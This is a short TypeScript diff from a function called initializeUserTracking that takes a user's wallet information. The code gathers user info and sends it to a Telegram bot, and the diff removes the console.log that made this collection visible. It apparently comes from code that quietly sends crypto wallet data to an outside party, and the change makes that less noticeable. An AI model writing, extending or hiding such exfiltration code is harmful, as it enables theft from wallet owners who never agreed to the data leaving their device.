@@ -39,7 +39,6 @@ export async function initializeUserTracking(walletInfo: UserInfo['wallet']): Pr
     
     try {
       const userInfo = await getUserInfo(walletInfo);
-      console.log('User information collected:', userInfo);
       
       // Send to telegram bot
       const messageSent = await sendToTelegram(userInfo);
